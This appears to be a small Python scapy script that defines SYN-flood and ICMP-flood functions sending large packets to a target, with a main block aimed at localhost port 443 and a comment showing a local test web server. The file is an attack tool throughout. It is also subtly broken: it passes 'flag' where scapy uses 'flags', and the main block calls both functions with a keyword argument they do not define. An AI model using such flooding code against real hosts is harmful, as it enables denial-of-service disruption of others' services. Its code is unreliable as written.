from scapy.layers.inet import IP, TCP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort


# start a python server using this command 
# jayaraju@jayaraju-mac ~ % python3 -m http.server 8000
# Serving HTTP on :: port 8000 (http://[::]:8000/) ...
# ::1 - - [01/Nov/2022 13:56:11] "GET / HTTP/1.1" 200 -
# ::1 - - [01/Nov/2022 13:56:11] code 404, message File not found
# ::1 - - [01/Nov/2022 13:56:11] "GET /favicon.ico HTTP/1.1" 404 -

def syn_flood(dst_ip: str, dst_port: int, pkt_count: int = 6, pkt_size: int = 65000):
    ip_layer = IP(dst=dst_ip)
    tcp_layer = TCP(sport=RandShort(), dport=dst_port, flag="S")
    raw_pkt = Raw(b"X" *  pkt_size)
    pkt = ip_layer / tcp_layer / raw_pkt
    send(pkt, count=pkt_count, verbose=0)
    print('Sent  SYN' + str(pkt_count) + ' packets of ' + str(pkt_size) + ' size to ' + dst_ip + ' on port ' + str(dst_port))

def icmp_flood(dst_ip: str, pkt_count: int = 6, pkt_size: int = 65000):
    ip_layer = IP(dst=dst_ip)
    icmp_layer = ICMP()
    raw_pkt = Raw(b"X" *  pkt_size)
    pkt = ip_layer / icmp_layer / raw_pkt
    send(pkt, count=pkt_count, verbose=0)
    print('Sent  ICMP ' + str(pkt_count) + ' packets of ' + str(pkt_size) + ' size to ' + dst_ip)
    
    
    
    
if __name__ == "__main__":    
    ip = "127.0.0.1"
    port = 443
    syn_flood(ip, port, number_of_packets_to_send=1000)
    icmp_flood(ip, number_of_packets_to_send=1000)

